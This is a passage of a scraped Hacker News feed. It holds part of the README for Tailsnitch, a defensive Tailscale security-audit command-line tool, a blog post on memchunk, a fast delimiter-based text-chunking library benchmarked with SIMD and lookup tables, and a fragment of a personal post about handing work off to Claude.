        &lt;cell&gt;AUTH-004&lt;/cell&gt;
        &lt;cell&gt;Replace with ephemeral keys&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;DEV-002&lt;/cell&gt;
        &lt;cell&gt;Remove tags from user devices&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;DEV-004&lt;/cell&gt;
        &lt;cell&gt;Delete stale devices&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;DEV-005&lt;/cell&gt;
        &lt;cell&gt;Authorize pending devices&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Fix mode also provides direct links to the admin console for issues that require manual intervention.&lt;/p&gt;
    &lt;p&gt;Generate evidence reports for SOC 2 audits with Common Criteria (CC) control mappings:&lt;/p&gt;
    &lt;code&gt;# Export as JSON
tailsnitch --soc2 json &amp;gt; soc2-evidence.json

# Export as CSV (for spreadsheets)
tailsnitch --soc2 csv &amp;gt; soc2-evidence.csv&lt;/code&gt;
    &lt;p&gt;The SOC 2 report includes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Per-resource test results (each device, key, ACL rule tested individually)&lt;/item&gt;
      &lt;item&gt;CC code mappings (CC6.1, CC6.2, CC6.3, CC6.6, CC7.1, CC7.2, etc.)&lt;/item&gt;
      &lt;item&gt;Pass/Fail/N/A status for each control test&lt;/item&gt;
      &lt;item&gt;Timestamp for audit trail&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Example CSV output:&lt;/p&gt;
    &lt;code&gt;resource_type,resource_id,resource_name,check_id,check_title,cc_codes,status,details,tested_at
device,node123,prod-server,DEV-001,Tagged devices with key expiry disabled,CC6.1;CC6.3,PASS,Tags: [tag:server] key expiry enabled,2025-01-05T10:30:00Z
key,tskey-auth-xxx,tskey-auth-xxx,AUTH-001,Reusable auth keys exist,CC6.1;CC6.2;CC6.3,FAIL,Reusable key expires in 45 days,2025-01-05T10:30:00Z
&lt;/code&gt;
    &lt;p&gt;Create a &lt;code&gt;.tailsnitch-ignore&lt;/code&gt; file to suppress findings for known-accepted risks:&lt;/p&gt;
    &lt;code&gt;# .tailsnitch-ignore
# Ignore informational checks
ACL-008  # We intentionally don't use groups
ACL-009  # Legacy ACLs are fine for our use case

# Ignore specific medium checks with justification
DEV-006  # External devices are approved contractors
LOG-001  # Flow logs require Enterprise plan&lt;/code&gt;
    &lt;p&gt;Ignore file locations (checked in order):&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;.tailsnitch-ignore&lt;/code&gt;in current directory&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;~/.tailsnitch-ignore&lt;/code&gt;in home directory&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;# Use a specific ignore file
tailsnitch --ignore-file /path/to/ignore

# Disable ignore file processing entirely
tailsnitch --no-ignore&lt;/code&gt;
    &lt;code&gt;# Export full report
tailsnitch --json &amp;gt; audit.json

# Extract failed checks as TSV
tailsnitch --json | jq -r '
  .suggestions
  | map(select(.pass == false))
  | .[]
  | [.id, .title, .severity, .remediation]
  | @tsv
' &amp;gt; findings.tsv

# Summary by severity
tailsnitch --json | jq '
  .suggestions
  | map(select(.pass == false))
  | group_by(.severity)
  | map({severity: .[0].severity, count: length})
'

# List critical/high issues with admin links
tailsnitch --json | jq -r '
  .suggestions
  | map(select(.pass == false and (.severity == "CRITICAL" or .severity == "HIGH")))
  | .[]
  | "\(.id): \(.title)\n  Fix: \(.fix.admin_url // "manual")\n"
'&lt;/code&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Flag&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--json&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Output as JSON&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--severity&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Filter by minimum severity: &lt;code&gt;critical&lt;/code&gt;, &lt;code&gt;high&lt;/code&gt;, &lt;code&gt;medium&lt;/code&gt;, &lt;code&gt;low&lt;/code&gt;, &lt;code&gt;info&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--category&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Filter by category: &lt;code&gt;access&lt;/code&gt;, &lt;code&gt;auth&lt;/code&gt;, &lt;code&gt;network&lt;/code&gt;, &lt;code&gt;ssh&lt;/code&gt;, &lt;code&gt;log&lt;/code&gt;, &lt;code&gt;device&lt;/code&gt;, &lt;code&gt;dns&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--checks&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Run specific checks (comma-separated IDs or slugs)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--list-checks&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;List all available checks and exit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--tailnet&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Specify tailnet to audit (default: from API key)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--verbose&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show passing checks too&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--fix&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Enable interactive fix mode&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--auto&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Auto-select safe fixes (requires &lt;code&gt;--fix&lt;/code&gt;)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--dry-run&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Preview fix actions without executing (requires &lt;code&gt;--fix&lt;/code&gt;)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--no-audit-log&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Disable audit logging of fix actions&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--soc2&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Export SOC 2 evidence: &lt;code&gt;json&lt;/code&gt; or &lt;code&gt;csv&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--tailscale-path&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Path to tailscale CLI (for Tailnet Lock checks)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--ignore-file&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Path to ignore file&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--no-ignore&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Disable ignore file processing&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;--version&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show version information&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Tailsnitch performs 52 security checks across 7 categories. See docs/CHECKS.md for detailed documentation of each check.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;ID&lt;/cell&gt;
        &lt;cell role="head"&gt;Check&lt;/cell&gt;
        &lt;cell role="head"&gt;Risk&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;ACL-001&lt;/cell&gt;
        &lt;cell&gt;Default 'allow all' policy&lt;/cell&gt;
        &lt;cell&gt;All devices have unrestricted access&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;ACL-002&lt;/cell&gt;
        &lt;cell&gt;SSH autogroup:nonroot misconfiguration&lt;/cell&gt;
        &lt;cell&gt;SSH as any non-root user&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;ACL-006&lt;/cell&gt;
        &lt;cell&gt;tagOwners too broad&lt;/cell&gt;
        &lt;cell&gt;Privilege escalation via tags&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;ACL-007&lt;/cell&gt;
        &lt;cell&gt;autogroup:danger-all usage&lt;/cell&gt;
        &lt;cell&gt;Access granted to external users&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;ID&lt;/cell&gt;
        &lt;cell role="head"&gt;Check&lt;/cell&gt;
        &lt;cell role="head"&gt;Risk&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;AUTH-001&lt;/cell&gt;
        &lt;cell&gt;Reusable auth keys&lt;/cell&gt;
        &lt;cell&gt;Unlimited device additions if stolen&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;AUTH-002&lt;/cell&gt;
        &lt;cell&gt;Long expiry auth keys&lt;/cell&gt;
        &lt;cell&gt;Extended exposure window&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;AUTH-003&lt;/cell&gt;
        &lt;cell&gt;Pre-authorized keys&lt;/cell&gt;
        &lt;cell&gt;Bypass device approval&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;DEV-001&lt;/cell&gt;
        &lt;cell&gt;Tagged devices without key expiry&lt;/cell&gt;
        &lt;cell&gt;Indefinite access&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;DEV-002&lt;/cell&gt;
        &lt;cell&gt;User devices tagged&lt;/cell&gt;
        &lt;cell&gt;Persist after user removal&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;DEV-010&lt;/cell&gt;
        &lt;cell&gt;Tailnet Lock disabled&lt;/cell&gt;
        &lt;cell&gt;No protection against stolen keys&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;DEV-012&lt;/cell&gt;
        &lt;cell&gt;Pending Tailnet Lock signatures&lt;/cell&gt;
        &lt;cell&gt;Unsigned nodes need review&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;NET-001&lt;/cell&gt;
        &lt;cell&gt;Funnel exposure&lt;/cell&gt;
        &lt;cell&gt;Public internet access&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;NET-003&lt;/cell&gt;
        &lt;cell&gt;Subnet router trust boundary&lt;/cell&gt;
        &lt;cell&gt;Unencrypted traffic on local network&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;SSH-002&lt;/cell&gt;
        &lt;cell&gt;Root SSH without check mode&lt;/cell&gt;
        &lt;cell&gt;No re-authentication required&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;ID&lt;/cell&gt;
        &lt;cell role="head"&gt;Check&lt;/cell&gt;
        &lt;cell role="head"&gt;Risk&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;ACL-004&lt;/cell&gt;
        &lt;cell&gt;autogroup:member usage&lt;/cell&gt;
        &lt;cell&gt;External users included&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;ACL-005&lt;/cell&gt;
        &lt;cell&gt;AutoApprovers configured&lt;/cell&gt;
        &lt;cell&gt;Bypass route approval&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;AUTH-004&lt;/cell&gt;
        &lt;cell&gt;Non-ephemeral CI/CD keys&lt;/cell&gt;
        &lt;cell&gt;Stale devices accumulate&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;DEV-003&lt;/cell&gt;
        &lt;cell&gt;Outdated clients&lt;/cell&gt;
        &lt;cell&gt;Potential vulnerabilities&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;DEV-004&lt;/cell&gt;
        &lt;cell&gt;Stale devices&lt;/cell&gt;
        &lt;cell&gt;Unused attack surface&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;DEV-005&lt;/cell&gt;
        &lt;cell&gt;Unauthorized devices&lt;/cell&gt;
        &lt;cell&gt;Pending approval queue&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;DEV-007&lt;/cell&gt;
        &lt;cell&gt;Sensitive machine names&lt;/cell&gt;
        &lt;cell&gt;CT log exposure&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;DEV-009&lt;/cell&gt;
        &lt;cell&gt;Device approval config&lt;/cell&gt;
        &lt;cell&gt;May not be enabled&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;NET-004&lt;/cell&gt;
        &lt;cell&gt;HTTPS CT log exposure&lt;/cell&gt;
        &lt;cell&gt;Machine names public&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;NET-005&lt;/cell&gt;
        &lt;cell&gt;Exit node traffic visibility&lt;/cell&gt;
        &lt;cell&gt;Operator sees all traffic&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;NET-006&lt;/cell&gt;
        &lt;cell&gt;Serve exposure&lt;/cell&gt;
        &lt;cell&gt;Local services on tailnet&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;SSH-003&lt;/cell&gt;
        &lt;cell&gt;Recorder UI exposure&lt;/cell&gt;
        &lt;cell&gt;Sessions visible to network&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Checks for logging configuration, DNS settings, user roles, and manual verification items.&lt;/p&gt;
    &lt;code&gt;+=====================================================================+
|                    TAILSNITCH SECURITY AUDIT                        |
|            Tailnet: example.com                                     |
|            Version: 1.0.0 (build: abc123)                           |
+=====================================================================+

  Using ignore file: .tailsnitch-ignore (3 rules)

=== ACCESS CONTROLS ===================================================

[CRITICAL] ACL-001: Default 'allow all' policy active
  Your ACL policy omits the 'acls' field. Tailscale applies a
  default 'allow all' policy, granting all devices full access.

  Remediation:
  Define explicit ACL rules following least privilege principle.

  Source: https://tailscale.com/kb/1192/acl-samples
----------------------------------------------------------------------

=== AUTHENTICATION &amp;amp; KEYS =============================================

[HIGH] AUTH-001: Reusable auth keys exist
  Found 2 reusable auth key(s). These can be reused to add
  multiple devices if compromised.

  Details:
    - Key tskey-auth-xxx (expires in 45 days)
    - Key tskey-auth-yyy (expires in 89 days)

  Remediation:
  Store reusable keys in a secrets manager. Prefer one-off keys.

  Source: https://tailscale.com/kb/1085/auth-keys
----------------------------------------------------------------------

SUMMARY
======================================================================
  Critical: 1  High: 3  Medium: 5  Low: 2  Info: 8
  Total findings: 19  |  Passed: 33
&lt;/code&gt;
    &lt;p&gt;Tailnet Lock checks (DEV-010, DEV-012) require the local &lt;code&gt;tailscale&lt;/code&gt; CLI and run against the local machine's daemon. When auditing a remote tailnet via &lt;code&gt;--tailnet&lt;/code&gt;, these checks reflect local status, not the audited tailnet.&lt;/p&gt;
    &lt;code&gt;# Specify custom tailscale binary path if needed
tailsnitch --tailscale-path /opt/tailscale/bin/tailscale&lt;/code&gt;
    &lt;p&gt;Run Tailsnitch in CI/CD pipelines to catch security regressions:&lt;/p&gt;
    &lt;code&gt;# GitHub Actions example
- name: Audit Tailscale Security
  env:
    TS_OAUTH_CLIENT_ID: ${{ secrets.TS_OAUTH_CLIENT_ID }}
    TS_OAUTH_CLIENT_SECRET: ${{ secrets.TS_OAUTH_CLIENT_SECRET }}
  run: |
    tailsnitch --json &amp;gt; audit.json
    # Fail if critical or high severity issues exist
    if tailsnitch --severity high --json | jq -e '.summary.critical + .summary.high &amp;gt; 0' &amp;gt; /dev/null; then
      echo "Critical or high severity issues found!"
      tailsnitch --severity high
      exit 1
    fi&lt;/code&gt;
    &lt;p&gt;MIT&lt;/p&gt;
    &lt;p&gt;See CONTRIBUTING.md for guidelines.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/Adversis/tailsnitch"/><published>2026-01-05T16:47:23+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46501665</id><title>So, you want to chunk really fast?</title><updated>2026-01-05T19:37:51.869384+00:00</updated><content>&lt;doc fingerprint="2730d2b2d780873b"&gt;
  &lt;main&gt;
    &lt;p&gt;we’ve been working on chonkie, a chunking library for RAG pipelines, and at some point we started benchmarking on wikipedia-scale datasets.&lt;/p&gt;
    &lt;p&gt;that’s when things started feeling… slow.&lt;/p&gt;
    &lt;p&gt;not unbearably slow, but slow enough that we started wondering: what’s the theoretical limit here? how fast can text chunking actually get if we throw out all the abstractions and go straight to the metal?&lt;/p&gt;
    &lt;p&gt;this post is about that rabbit hole, and how we ended up building memchunk.&lt;/p&gt;
    &lt;head rend="h2"&gt;what even is chunking?&lt;/head&gt;
    &lt;p&gt;if you’re building anything with LLMs and retrieval, you’ve probably dealt with this: you have a massive pile of text, and you need to split it into smaller pieces that fit into embedding models or context windows.&lt;/p&gt;
    &lt;p&gt;the naive approach is to split every N characters. but that’s dumb — you end up cutting sentences in half, and your retrieval quality tanks.&lt;/p&gt;
    &lt;p&gt;the smart approach is to split at semantic boundaries: periods, newlines, question marks. stuff that actually indicates “this thought is complete.”&lt;/p&gt;
    &lt;code&gt;"Hello world. How are you?"
     → ["Hello world.", " How are you?"]
&lt;/code&gt;
    &lt;head rend="h3"&gt;why delimiters are enough&lt;/head&gt;
    &lt;p&gt;there are fancy chunking strategies out there — sentence splitters, recursive chunkers, semantic chunkers that use embeddings. but for most use cases, the key thing is just not cutting sentences in half.&lt;/p&gt;
    &lt;p&gt;token-based and character-based chunkers don’t care where sentences end. they just split at N tokens or N bytes. that means you get chunks like:&lt;/p&gt;
    &lt;code&gt;"The quick brown fox jumps over the la"
"zy dog."
&lt;/code&gt;
    &lt;p&gt;the embedding for that first chunk is incomplete. it’s a sentence fragment.&lt;/p&gt;
    &lt;p&gt;delimiter-based chunking avoids this. if you split on &lt;code&gt;.&lt;/code&gt; and &lt;code&gt;?&lt;/code&gt; and &lt;code&gt;\n&lt;/code&gt;, your chunks end at natural boundaries. you don’t need NLP pipelines or embedding models to find good split points — just byte search.&lt;/p&gt;
    &lt;p&gt;simple concept. but doing it fast? that’s where things get interesting.&lt;/p&gt;
    &lt;head rend="h2"&gt;enter memchr&lt;/head&gt;
    &lt;p&gt;the memchr crate by Andrew Gallant is the foundation here. it’s a byte search library with multiple layers of optimization.&lt;/p&gt;
    &lt;head rend="h3"&gt;the fallback: SWAR&lt;/head&gt;
    &lt;p&gt;even without SIMD instructions, memchr is fast. the generic implementation uses SWAR (SIMD Within A Register) — a clever trick that processes 8 bytes at a time using regular 64-bit operations.&lt;/p&gt;
    &lt;p&gt;the core idea: to find a byte in a chunk, XOR the chunk with the needle splatted across all 8 positions. any matching byte becomes zero. then use bit manipulation to detect if any byte is zero:&lt;/p&gt;
    &lt;p&gt;the &lt;code&gt;has_zero_byte&lt;/code&gt; trick works because subtracting 1 from a zero byte causes a borrow that propagates to the high bit. no branches, no loops over individual bytes.&lt;/p&gt;
    &lt;head rend="h3"&gt;the fast path: AVX2/SSE2&lt;/head&gt;
    &lt;p&gt;on x86_64 with SIMD support, memchr upgrades to vector instructions. AVX2 processes 32 bytes at once:&lt;/p&gt;
    &lt;p&gt;if &lt;code&gt;mask&lt;/code&gt; is non-zero, at least one byte matched. &lt;code&gt;trailing_zeros()&lt;/code&gt; gives the position.&lt;/p&gt;
    &lt;p&gt;memchr also has a hybrid strategy: it stores both SSE2 (16-byte) and AVX2 (32-byte) searchers, using SSE2 for small haystacks and AVX2 for larger ones.&lt;/p&gt;
    &lt;head rend="h3"&gt;the API&lt;/head&gt;
    &lt;p&gt;memchr provides three variants:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;memchr(needle, haystack)&lt;/code&gt;— find one byte&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;memchr2(n1, n2, haystack)&lt;/code&gt;— find either of two bytes&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;memchr3(n1, n2, n3, haystack)&lt;/code&gt;— find any of three bytes&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;for two or three needles, it runs multiple comparisons and ORs the results together. but notice: it stops at three.&lt;/p&gt;
    &lt;head rend="h2"&gt;the three-character limit&lt;/head&gt;
    &lt;p&gt;why only three? from memchr’s source code:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;only one, two and three bytes are supported because three bytes is about the point where one sees diminishing returns. beyond this point and it’s probably (but not necessarily) better to just use a simple&lt;/p&gt;&lt;code&gt;[bool; 256]&lt;/code&gt;array or similar.&lt;/quote&gt;
    &lt;p&gt;each additional needle requires another comparison and OR operation. with 3 needles you’re doing 3 broadcasts, 3 comparisons, and 2 ORs per 32-byte chunk. a 4th needle adds another ~33% overhead, and the gains from SIMD start looking less impressive compared to simpler approaches.&lt;/p&gt;
    &lt;p&gt;the memchr authors explicitly chose not to implement &lt;code&gt;memchr4&lt;/code&gt; or beyond — it’s not a limitation, it’s a design decision.&lt;/p&gt;
    &lt;p&gt;so what happens when you want to split on &lt;code&gt;\n&lt;/code&gt;, &lt;code&gt;.&lt;/code&gt;, &lt;code&gt;?&lt;/code&gt;, &lt;code&gt;!&lt;/code&gt;, and &lt;code&gt;;&lt;/code&gt;? that’s 5 delimiters. memchr can’t help directly.&lt;/p&gt;
    &lt;head rend="h2"&gt;the fallback: lookup tables&lt;/head&gt;
    &lt;p&gt;when you have more than 3 delimiters, we fall back to a classic technique: the 256-entry lookup table.&lt;/p&gt;
    &lt;p&gt;this is O(1) per byte — just an array index. no loops, no comparisons, no branching. modern CPUs love this because it’s completely predictable.&lt;/p&gt;
    &lt;p&gt;is it as fast as SIMD? no. but it’s still really fast, and it handles arbitrary delimiter sets.&lt;/p&gt;
    &lt;head rend="h2"&gt;why search backwards?&lt;/head&gt;
    &lt;p&gt;there’s one more trick: we search backwards from &lt;code&gt;chunk_size&lt;/code&gt;, not forwards from 0.&lt;/p&gt;
    &lt;p&gt;if you search forward, you need to scan through the entire window to find where to split. you’d find a delimiter at byte 50, but you can’t stop there — there might be a better split point closer to your target size. so you keep searching, tracking the last delimiter you saw, until you finally cross the chunk boundary. that’s potentially thousands of matches and index updates.&lt;/p&gt;
    &lt;p&gt;backward search? one lookup. start at &lt;code&gt;chunk_size&lt;/code&gt;, search backward, and the first delimiter you hit is your split point. done.&lt;/p&gt;
    &lt;code&gt;target_size = 100
text: "Hello. World. This is a test. Here's more text..."

forward search:
  - find "." at 6, save it, keep going
  - find "." at 13, save it, keep going
  - find "." at 30, save it, keep going
  - ... eventually cross boundary, use last saved position
  → multiple searches, lots of bookkeeping

backward search:
  - start at position 100, search backward
  - find "." at 30, done
  → one search, no bookkeeping
&lt;/code&gt;
    &lt;p&gt;fewer operations means less overhead. we use &lt;code&gt;memrchr&lt;/code&gt; (reverse memchr) instead of &lt;code&gt;memchr&lt;/code&gt; for exactly this reason.&lt;/p&gt;
    &lt;head rend="h2"&gt;putting it together&lt;/head&gt;
    &lt;p&gt;memchunk automatically picks the right strategy:&lt;/p&gt;
    &lt;p&gt;the table is only built once, lazily, on the first iteration. after that, it’s pure speed.&lt;/p&gt;
    &lt;head rend="h2"&gt;benchmarks&lt;/head&gt;
    &lt;p&gt;we ran this against the other rust chunking libraries we could find:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;library&lt;/cell&gt;
        &lt;cell role="head"&gt;throughput&lt;/cell&gt;
        &lt;cell role="head"&gt;vs memchunk&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;memchunk&lt;/cell&gt;
        &lt;cell&gt;164 GB/s&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;kiru&lt;/cell&gt;
        &lt;cell&gt;4.5 GB/s&lt;/cell&gt;
        &lt;cell&gt;36x slower&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;langchain&lt;/cell&gt;
        &lt;cell&gt;0.35 GB/s&lt;/cell&gt;
        &lt;cell&gt;469x slower&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;semchunk&lt;/cell&gt;
        &lt;cell&gt;0.013 GB/s&lt;/cell&gt;
        &lt;cell&gt;12,615x slower&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;llama-index&lt;/cell&gt;
        &lt;cell&gt;0.0035 GB/s&lt;/cell&gt;
        &lt;cell&gt;46,857x slower&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;text-splitter&lt;/cell&gt;
        &lt;cell&gt;0.0017 GB/s&lt;/cell&gt;
        &lt;cell&gt;96,471x slower&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;the exact throughput varies with file size and delimiter count — larger files and fewer delimiters favor SIMD more. but even in pessimistic cases (small chunks, many delimiters), we’re still in the hundreds of GB/s range.&lt;/p&gt;
    &lt;p&gt;for reference, that’s chunking english wikipedia (~20GB) in roughly 120 milliseconds.&lt;/p&gt;
    &lt;head rend="h2"&gt;python and wasm bindings&lt;/head&gt;
    &lt;p&gt;since chonkie is a python library, we needed python bindings. we also added wasm for browser/node use cases.&lt;/p&gt;
    &lt;p&gt;both return zero-copy views (&lt;code&gt;memoryview&lt;/code&gt; in python, subarray in js), so you get most of the performance even across FFI boundaries.&lt;/p&gt;
    &lt;head rend="h2"&gt;wrapping up&lt;/head&gt;
    &lt;p&gt;the techniques here aren’t novel — SIMD search and lookup tables are textbook stuff. the win comes from knowing when to use which:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;1-3 delimiters → memchr’s SIMD search&lt;/item&gt;
      &lt;item&gt;4+ delimiters → 256-entry lookup table&lt;/item&gt;
      &lt;item&gt;minimize allocations → return offsets, let the caller slice&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;memchunk is on crates.io, pypi, and npm if you want to try it out.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://minha.sh/posts/so,-you-want-to-chunk-really-fast"/><published>2026-01-05T17:19:33+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46501677</id><title>How Y Combinator made it smart to trust founders</title><updated>2026-01-05T19:37:51.784159+00:00</updated><content/><link href="https://elbowgreasegames.substack.com/p/when-good-actors-can-trust-each-other"/><published>2026-01-05T17:20:01+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46501987</id><title>Calibrating My Turtle</title><updated>2026-01-05T19:37:51.653442+00:00</updated><content>&lt;doc fingerprint="7f2b1b7e3fb5a15d"&gt;
  &lt;main&gt;
    &lt;p&gt;Then, by default, I change my work to doing Y, which usually includes invoking Claude to do X.&lt;/p&gt;
    &lt;p&gt;insert SpongeBob “3 Days Later” interstitial&lt;/p&gt;
    &lt;p&gt;Then, at some point, the thought finally occurs: “Oh! Claude could ALSO do Y!”&lt;/p&gt;
    &lt;p&gt;I'm months into using Claude, but still I have these head-smack moments, at a rate that might be harshing my mental health. There are a lot of turtles down there, and it weirds me thinking about which turtles to hand off to Claude and which one I should tether myself to.&lt;/p&gt;
    &lt;p&gt;I'm no doubt more productive in the small with Claude. But I still have to manage something. Am I more productive in the large? Probably, but I think there are plenty of things I still have to do that will be blockers.&lt;/p&gt;
    &lt;p&gt;Enter Steve Yegge's Gas Town. That's ambitious! I've been thinking about individual turtles while Steve is cattle-driving hordes of them. (Turtle Horde — cool band name — I called it.)&lt;/p&gt;
    &lt;p&gt;Can Gas Town really work? For some problems maybe? My mind is too small to know. But people still gotta do SOMETHING with what is created, right?&lt;/p&gt;
    &lt;p&gt;Then we have the tweet from the googler saying Claude did in an hour what it took them a year. That also feels off to me.&lt;/p&gt;
